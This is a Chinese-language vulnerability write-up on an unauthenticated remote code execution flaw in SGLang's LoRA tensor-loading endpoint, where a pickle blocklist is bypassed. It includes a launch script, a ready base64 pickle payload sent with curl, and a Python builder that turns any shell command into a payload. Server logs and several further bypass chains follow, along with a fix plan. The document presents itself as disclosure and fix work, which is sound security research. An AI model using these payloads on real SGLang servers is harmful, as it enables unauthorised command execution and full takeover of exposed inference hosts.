# SGLang 反序列化 RCE：CVE-2026-15969 实战演示

> 安全漏洞演示文档。本文从一个 **无需认证**、只需网络可达即可利用的远程代码执行（RCE）漏洞出发，讲清楚**为什么 SGLang 没能拦住它**，并给出**可一键复现的 PoC**。
>
> ⚠️ **免责声明**：本文的 PoC 只执行一个无害命令（在服务器上写入一个 marker 文件 `touch/echo`），**仅用于测试你自己部署的环境**。请勿对任何未授权系统执行。

---

## 1. 漏洞是什么

| 项 | 内容 |
|----|------|
| CVE | [CVE-2026-15969](https://nvd.nist.gov/vuln/detail/CVE-2026-15969) |
| CNNVD | CNNVD-2026-81331394 |
| 严重性 | **CVSS 9.8 Critical**（`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`） |
| 类型 | [CWE-502](https://cwe.mitre.org/data/definitions/502.html) 不可信数据反序列化 |
| 利用条件 | **无认证**，仅需网络可达 SGLang HTTP 端口（默认 30000） |
| 官方描述 | 通过 `SafeUnpickler` 不完整黑名单的绕过，在 `/load_lora_adapter_from_tensors` 端点实现未授权 RCE，攻击者可构造 base64 编码的 pickle 载荷执行任意命令 |

**影响版本**：CERT/CC 公告口径为 `<= v0.5.15`。但**截至 2026-08-11，社区最新 main（含 v0.5.16 / v0.5.17）仍未合入任何修复**，实测最新代码上该漏洞仍可利用。

---

## 2. 为什么会中招：一层没拦住的防线

要理解这个问题，需要先理解 SGLang 的"安全防线"是怎么设计的，以及 pickle 这个协议的特殊性。

### 2.1 pickle 反序列化 = 执行一段字节码

Python 的 `pickle` 不是简单的"数据格式"，而是一套**栈式虚拟机**。反序列化时，pickle 流里的操作码会被逐个"执行"：

- `GLOBAL <module> <name>` → 导入模块、取属性（等价于一次反射调用）
- `REDUCE` → **调用**栈上的可调用对象

也就是说，只要攻击者能把一个"危险的可调用对象"送进 pickle 流，反序列化的瞬间就会**真的执行它**。这是所有 pickle 反序列化漏洞的根源。

### 2.2 SGLang 的防线：黑名单 + 前缀白名单

SGLang 用 `SafeUnpickler`（`python/sglang/srt/utils/common.py`）拦截 `GLOBAL`，逻辑只有两层：

```python
def find_class(self, module, name):
    # 第 1 层：显式黑名单
    if (module, name) in self.DENY_CLASSES:        # ("builtins","eval")、("os","system") ...
        raise RuntimeError("Blocked")
    # 第 2 层：前缀白名单
    if module 以 ALLOWED_MODULE_PREFIXES 中任意前缀开头:  # "builtins."、"torch." ...
        return super().find_class(module, name)    # 放行，正常导入
    raise RuntimeError("Blocked")
```

黑名单里确实挡了 `("os", "system")`、`("builtins", "eval")` 这些"最明显"的目标。

### 2.3 漏洞点：`builtins.` 前缀放行，但 `getattr` / `__import__` 不在黑名单

问题出在**前缀白名单太宽**：

- `builtins.` 在前缀白名单里（因为合法载荷需要 `builtins.dict` / `builtins.list` 等）；
- 但 `builtins.getattr` 和 `builtins.__import__` **不在黑名单**里。

于是攻击者不需要直接拿到 `os.system`（那个被黑名单挡了），而是**绕一步**：

```
GLOBAL builtins.__import__   → 调用 __import__("os")     = os 模块      ← 查的是 builtins.__import__，黑名单管不到
GLOBAL builtins.getattr      → 调用 getattr(os, "system") = os.system    ← 查的是 builtins.getattr，黑名单管不到
REDUCE                       → 调用 os.system("任意命令") = 任意命令执行  ← ("os","system") 的黑名单形同虚设
```

黑名单只拦"直接导入危险函数"，但攻击者通过 `__import__ + getattr` 在运行时**现造**了一个危险函数。这本质上是个**黑名单永远不完备**的问题——即使这次补上 `getattr/__import__`，同一套 allowlist 里还有 `operator.attrgetter`、`pickletools.sys` 等"通用反射原语"可以组出等价的链（下文 §5 有实测）。

### 2.4 为什么连鉴权都绕过了

`/load_lora_adapter_from_tensors` 是**唯一**一个没标 `@auth_level` 的管理类 LoRA 端点（相邻的 `/load_lora_adapter`、`/unload_lora_adapter` 都有）。

SGLang 的鉴权语义：端点默认 `AuthLevel.NORMAL`，中间件**只在配置了 `--api-key` 时才校验**。所以：

- 默认部署（无任何 key）：直接无鉴权调用；
- 只配了 `--admin-api-key`（没配 `--api-key`）：`NORMAL` 端点仍被放行 —— 也一样无鉴权。

### 2.5 两个"绕过防御"的细节

**细节 1：早期版本反序列化先于业务校验。** issue #30165 报告的原始版本里，pickle 在 `tp_worker` 中被反序列化，而 `enable_lora` 这类业务检查发生在**之后**——因此攻击连"启用 LoRA"都不需要，端点可达即中招。

**细节 2：当前 main 把 `enable_lora` 检查提前了，但真实部署依然可被利用。** 后续重构把 guard 挪到了反序列化之前（`tokenizer_control_mixin.py`），没有 `--enable-lora` 时会在早期拦截。但**启用了 LoRA 的部署完全不受影响**——攻击者依然无需任何 key，只要端点可达。这个改动只是收窄了"裸服务器"的攻击面，并没有修掉反序列化漏洞本身。

---

## 3. 复现

### 前置条件

- Qwen3.6-35B-A3B 服务（按下面启动脚本拉起），HTTP 端口可达（默认 20266）；
- 不配 `--api-key`（或只配 `--admin-api-key`），保持无鉴权。

### 启动服务

基于真实部署脚本 [start_qwen36.sh](file:///home/y00970600/test_files/start_qwen36.sh) 精简：去掉 cuda-graph、投机解码（NEXTN）、multimodal、reasoning/tool parser 等与本演示无关的开关，只留能拉起 Qwen3.6-35B-A3B 的最小配置。**必须带 `--enable-lora`**（当前 main 在反序列化之前就检查这个开关，不带会返回 "LoRA is not enabled"）：

```bash
export PYTORCH_NPU_ALLOC_CONF=expandable_segments:True
export STREAMS_PER_DEVICE=32
export DEEPEP_HCCL_BUFFSIZE=300
export HCCL_SOCKET_IFNAME=lo
export GLOO_SOCKET_IFNAME=lo
export HCCL_OP_EXPANSION_MODE=AIV
export SGLANG_SET_CPU_AFFINITY=1
export ASCEND_USE_FIA=1
export GDN_ATTN_BACKEND_TRITON=1

python3 -m sglang.launch_server \
  --model-path /mnt/paas/weights/Qwen3.6-35B-A3B \
  --host 0.0.0.0 \
  --port 20262 \
  --tp-size 2 \
  --nnodes 1 \
  --device npu \
  --attention-backend ascend \
  --dtype bfloat16 \
  --mamba-ssm-dtype bfloat16 \
  --trust-remote-code \
  --disable-cuda-graph \
  --enable-lora \
  --max-lora-rank 64 \
  --lora-target-modules q_proj k_proj v_proj o_proj \
  --chunked-prefill-size -1 \
  --mamba-scheduler-strategy extra_buffer \
  --max-running-requests 40 \
  --max-mamba-cache-size 40 \
  --mem-fraction-static 0.7 \
  --base-gpu-id 12
```

说明：
- `--enable-lora` 必须带；现在的 main 还要求同时给 `--max-lora-rank` + `--lora-target-modules`（或不给这俩、改给初始 `--lora-paths`），否则启动直接断言失败（`check_lora_server_args`）；
- **不要用 `--lora-target-modules all`**：Qwen3.6 是 MoE 模型，`all` 会自动把专家投影 `gate_up_proj/down_proj` 也加进来，触发 MoE LoRA（`FusedMoEWithLoRA`），而 ASCEND 后端不支持（`NotImplementedError: LoRA MoE not supported for backend MoeRunnerBackend.ASCEND`）。所以这里显式只给 attention 投影 `q_proj k_proj v_proj o_proj`（注意用**空格**分隔，`--lora-target-modules` 是 `nargs="*"`，逗号拼一起会直接 argparse 报错；SGLang 内部会归一化成 `qkv_proj/o_proj` 去匹配模型的 `qkv_proj`），完全绕开 MoE；
- 演示根本不会真的加载 LoRA，只借 `--enable-lora` 让端点可达，所以 target 只覆盖 attention 就够；
- `--host 0.0.0.0`：让攻击机跨网络可达（原脚本是 `127.0.0.1`，只允许本机）；
- 想后台运行 + 日志，直接用原脚本，把上面的 `--enable-lora`、`--max-lora-rank 64`、`--lora-target-modules q_proj k_proj v_proj o_proj` 三行加进去即可。

### 攻击命令

**方式一：curl 一行**

```bash
# 载荷执行：echo "i am hacked, and my ip is $(curl -s ip.sb)" | tee /home/y00970600/test_files/sglang_pwned.txt
PAYLOAD='gARjYnVpbHRpbnMKZ2V0YXR0cgpjYnVpbHRpbnMKX19pbXBvcnRfXwqMAm9zhVKMBnN5c3RlbYZSjGNlY2hvICJpIGFtIGhhY2tlZCwgYW5kIG15IGlwIGlzICQoY3VybCAtcyBpcC5zYikiIHwgdGVlIC9ob21lL3kwMDk3MDYwMC90ZXN0X2ZpbGVzL3NnbGFuZ19wd25lZC50eHSFUi4='

# serialized_named_tensors 是 List，每 rank 一份（TP2 传 2 份）
curl -sS -X POST "http://<SERVER_IP>:20266/load_lora_adapter_from_tensors" \
  -H 'Content-Type: application/json' \
  -d "{\"lora_name\":\"evil\",\"config_dict\":{},\"serialized_named_tensors\":[\"${PAYLOAD}\",\"${PAYLOAD}\"]}"
```

**方式二：Python 脚本（可自定义命令）**

```python
import base64
import requests


def build_payload(cmd: str) -> str:
    """构造 CVE-2026-15969 攻击载荷（base64 字符串）。
    等价于：__import__("os") -> getattr(os, "system") -> os.system(cmd)
    """
    def pglob(m, n):
        return b"c" + m.encode() + b"\n" + n.encode() + b"\n"

    def pstr(s):
        b = s.encode()
        return b"\x8c" + bytes([len(b)]) + b

    PROTO, T1, T2, R, STOP = b"\x80\x04", b"\x85", b"\x86", b"R", b"."
    payload = (
        PROTO
        + pglob("builtins", "getattr")
        + pglob("builtins", "__import__")
        + pstr("os") + T1 + R                    # __import__("os") = os 模块
        + pstr("system") + T2 + R                # getattr(os, "system") = os.system
        + pstr(cmd) + T1 + R                     # os.system(cmd)
        + STOP
    )
    return base64.b64encode(payload).decode()


server = "http://127.0.0.1:20262"
cmd = 'echo "i am hacked, and my ip is $(curl -s ip.sb)" | tee /home/y00970600/test_files/sglang_pwned.txt'   # 换成任意命令 = RCE

resp = requests.post(
    f"{server}/load_lora_adapter_from_tensors",
    json={"lora_name": "evil", "config_dict": {}, "serialized_named_tensors": [build_payload(cmd)] * 2},
)
print("HTTP status:", resp.status_code)

# 在服务器上验证（需要有服务器 shell）：
# cat /home/y00970600/test_files/sglang_pwned.txt
```

### 验证

请求发出去后，不管 HTTP 返回什么（业务错误 400 也不影响），命令已经在服务器上执行。在服务器上：

```bash
$ cat /home/y00970600/test_files/sglang_pwned.txt
i am hacked, and my ip is 113.46.19.3
```

把载荷里的命令换成任何系统命令，就是完整 RCE。

### 真实部署实测（2026-08-11）

在内部 Ascend NPU 部署（Qwen3.6-35B-A3B，`--enable-lora`，社区最新 main）上实际执行：

```
$ curl -s -o /dev/null -w "HTTP %{http_code}\n" http://<server>:20266/health
HTTP 200

$ # 发送上述恶意请求后：
$ cat /tmp/sglang_pwned_ip.txt
113.46.19.3
```

服务器返回的是业务错误（HTTP 400），**但命令已在服务器上执行**，抓到的 `113.46.19.3` 与服务器真实出口公网 IP 一致，服务进程存活。这就是"无声的突破"：攻击者拿到了与业务无关的任意代码执行能力。
修复前：
```text
[2026-08-12 03:09:30] INFO:     127.0.0.1:58376 - "POST /v1/chat/completions HTTP/1.1" 200 OK
[2026-08-12 03:09:30] The server is fired up and ready to roll!
[2026-08-12 03:13:28] Start load Lora adapter from tensors. Lora name=evil
i am hacked, and my ip is 113.46.19.3
[2026-08-12 03:13:29 TP0] LoRA adapter loading from tensors starts: LoRARef(lora_id=1336e6ebc98849e3ab8d96537c0ff662, lora_name=evil, lora_path=__tensor__, pinned=False).
[2026-08-12 03:13:29 TP0] LoRA adapter loading from tensors completes: LoRARef(lora_id=1336e6ebc98849e3ab8d96537c0ff662, lora_name=evil, lora_path=__tensor__, pinned=False).
/usr/local/python3.11.15/lib/python3.11/site-packages/fastapi/routing.py:352: FastAPIDeprecationWarning: ORJSONResponse is deprecated, FastAPI now serializes data directly to JSON bytes via Pydantic when a return type or response model is set, which is faster and doesn't need a custom response class. Read more in the FastAPI docs: https://fastapi.tiangolo.com/advanced/custom-response/#orjson-or-response-model and https://fastapi.tiangolo.com/tutorial/response-model/
  return await dependant.call(**values)
[2026-08-12 03:13:29] INFO:     127.0.0.1:38112 - "POST /load_lora_adapter_from_tensors HTTP/1.1" 400 Bad Request
i am hacked, and my ip is 113.46.19.3
```
修复后：
```text
[2026-08-12 03:23:56] INFO:     127.0.0.1:46148 - "POST /v1/chat/completions HTTP/1.1" 200 OK
[2026-08-12 03:23:56] The server is fired up and ready to roll!
[2026-08-12 03:24:04] Start load Lora adapter from tensors. Lora name=evil
[2026-08-12 03:24:04 TP0] Failed to load LoRA adapter from tensors: Blocked unsafe class loading (builtins.getattr), to prevent exploitation of CVE-2025-10164
[2026-08-12 03:24:04 TP1] Failed to load LoRA adapter from tensors: Blocked unsafe class loading (builtins.getattr), to prevent exploitation of CVE-2025-10164
/usr/local/python3.11.15/lib/python3.11/site-packages/fastapi/routing.py:352: FastAPIDeprecationWarning: ORJSONResponse is deprecated, FastAPI now serializes data directly to JSON bytes via Pydantic when a return type or response model is set, which is faster and doesn't need a custom response class. Read more in the FastAPI docs: https://fastapi.tiangolo.com/advanced/custom-response/#orjson-or-response-model and https://fastapi.tiangolo.com/tutorial/response-model/
  return await dependant.call(**values)
[2026-08-12 03:24:04] INFO:     127.0.0.1:47068 - "POST /load_lora_adapter_from_tensors HTTP/1.1" 400 Bad Request
```
---

## 4. 为什么说这是"系统性"问题，而不只是漏配一个名字

黑名单方案的一个致命特性：**只要 allowlist 里还有"通用反射"模块，黑名单就永远可以绕过**。同样的思路，即使补上 `getattr`/`__import__`，用当前代码库里 allowlist 允许的成员仍能组出等价链。

例如，我在最新社区 main（2026-08-11）上实测成功的另一条链，**只用 allowlist 里本来就允许的成员**：

```
GLOBAL operator.attrgetter    # "operator." 前缀在 allowlist，且不在黑名单
GLOBAL operator.itemgetter    # 同上
GLOBAL pickletools.sys        # "pickletools." 前缀在 allowlist，sys 是其模块引用
REDUCE ... → attrgetter("modules")(sys)     = sys.modules
REDUCE ... → itemgetter("os")(sys.modules)  = os 模块
REDUCE ... → attrgetter("system")(os)       = os.system
REDUCE ... → os.system("任意命令")
```

在最新 main 上该链成功执行了命令（`/tmp` 下 marker 文件已生成）。

**结论**：这不是"少写了一行黑名单"的偶发 bug，而是"用黑名单去对抗 pickle 这种可执行格式"的**结构性缺陷**。这也是为什么修复不能靠继续加黑名单，而必须收敛到**精确白名单**（把 `builtins.` 这种前缀放行改成"只允许 dict/list/tuple/bytes 等具体名字"），或干脆更换序列化协议。

---

## 5. 第一版修复为何仍可绕过（2026-08-12 实测）

基于上一节的结论，我们做了第一版修复（精确白名单）：把 `builtins.`/`operator.`/`pickletools.`/`types.` 等"通用模块"从前缀放行改成**精确名字白名单**，并给端点加鉴权。**原始链（`builtins.getattr`+`__import__`）和 operator/pickletools 链确实被拦住了**——但同一天在对修复后服务器的实测中，我们又找到了两条**能完全绕过**的链。

### 5.1 绕过 1：`sglang.srt.utils.*` 前缀下藏着反射原语 `dynamic_import`

第一版修复保留了 `sglang.srt.utils.` 等 `sglang.srt.*` 前缀放行（理由是"可信内部模块"）。但 `sglang.srt.utils.common` 里有个**无任何校验**的函数：

```python
def dynamic_import(func_path: str):
    parts = func_path.split(".")
    module = importlib.import_module(".".join(parts[:-1]))
    return getattr(module, parts[-1])          # 任意模块任意属性，攻击者可控
```

攻击链（在修复后服务器上实测执行成功）：

```text
GLOBAL sglang.srt.utils.common.dynamic_import     ← sglang.srt.utils. 前缀放行
REDUCE dynamic_import("os.system")                 → 返回 os.system（运行时值，不经过 find_class）
REDUCE os.system("touch /tmp/pwn_dynamic_import")  → 命令执行
```

且同一函数还被 re-export 到了 `sglang.srt.model_executor.model_runner_components.weight_updater`（该模块前缀也在白名单里），**只删 `utils` 前缀堵不死这条**。

### 5.2 绕过 2（更根本）：`io_struct._maybe_unwrap_pickle` 嵌套原生 `pickle.loads`

`/load_lora_adapter_from_tensors` 的输入最终在 `tp_worker._deserialize_own_rank` 里用 `SafeUnpickler` 解析。但 `sglang.srt.managers.*` 前缀下有一个**原生反序列化函数**：

```python
# sglang/srt/managers/io_struct.py
def _maybe_unwrap_pickle(obj):
    if isinstance(obj, PickleWrapper):
        obj = pickle.loads(obj.data)      # 原生 pickle.loads，完全不受 SafeUnpickler 限制
        return obj
    return obj
```

攻击者只需在**外层载荷**里（走 SafeUnpickler）构造 `_maybe_unwrap_pickle(PickleWrapper(攻击字节))`，内层就触发**原生 `pickle.loads`**——等于把整个白名单/黑名单机制彻底跳过。在修复后服务器上实测执行成功（marker 文件生成，A/B 复现）。

### 5.3 为什么这两条链都绕得过"精确白名单"

因为 `find_class` 只在**加载名字**时拦截。攻击者一旦拿到一个"反射原语"（`dynamic_import`：按字符串 import+getattr）或"嵌套反序列化函数"（`_maybe_unwrap_pickle`：调原生 pickle.loads），**运行时组装出的 `os.system` 是个值，根本不经过 find_class**。这与 CVE 原始链（`builtins.getattr`+`__import__`）是**同一个攻击模式**——区别只是反射原语从 `builtins` 换成了 sglang 自己的模块。

**结构性结论**：前缀白名单 + 黑名单的组合**无法可靠对抗 pickle**。只要放行前缀里存在"反射原语"或"原生反序列化函数"，就能组出等价 RCE 链；而这类函数在大型代码库里不可穷举。

### 5.4 正确的修复方向（已在 fix-rce 分支实施）

1. **`sglang.srt.*` 不再前缀放行**，改为**精确 (module, symbol) 白名单**——只允许合法载荷确实引用的内部类（实测只有 `FlattenedTensorBucket`/`FlattenedTensorMetadata`/`LocalSerializedTensor`），`dynamic_import`/`_maybe_unwrap_pickle` 等从此不可达；
2. 保留 `torch.*`/`multiprocessing.*`/`torch_npu.*` 前缀（张量载荷必需），但把 `torch.load`/`torch.hub.load`/`cpp_extension.load*` 等高危入口加入 DENY（纵深防御）；
3. 两个 pickle 端点（`/load_lora_adapter_from_tensors`、`/update_weights_from_tensor`）鉴权升级为 **ADMIN_FORCE**：未显式配置 `--admin-api-key` 则直接拒绝；
4. **wire format 双格式过渡**：sglang 自带客户端（engine API / HTTP engine server）全部改发 **safetensors**（`serialized_named_tensors` 张量载荷，无任何代码执行语义）；服务端格式感知反序列化——safetensors 走 `safetensors.torch.load`，**旧 pickle 仍兼容**（走加固后的 SafeUnpickler）。彻底移除 pickle 只需后续弃用旧格式，无需再改架构。

---

## 6. 缓解（官方公告的临时措施，截至本文撰写时无官方修复版本）

1. **不要**把 SGLang 暴露到不可信网络，做好网络隔离；
2. 在 `environ.py` 里把 `SGLANG_USE_PICKLE_IPC` 设为 `false`；
3. 按需关闭未使用的管理端点；
4. 配置 API key（能挡住"只配 admin key"场景下的部分调用）。

---

## 参考链接

- [NVD: CVE-2026-15969](https://nvd.nist.gov/vuln/detail/CVE-2026-15969)
- [CERT/CC VU#281278（SGLang 六漏洞公告）](https://kb.cert.org/vuls/id/281278)
- [GitHub issue #30165（含原始 PoC 与调用链分析）](https://github.com/sgl-project/sglang/issues/30165)
- [GitHub security advisory GHSA-h74r-pwx2-6qr2](https://github.com/sgl-project/sglang/security/advisories/GHSA-h74r-pwx2-6qr2)
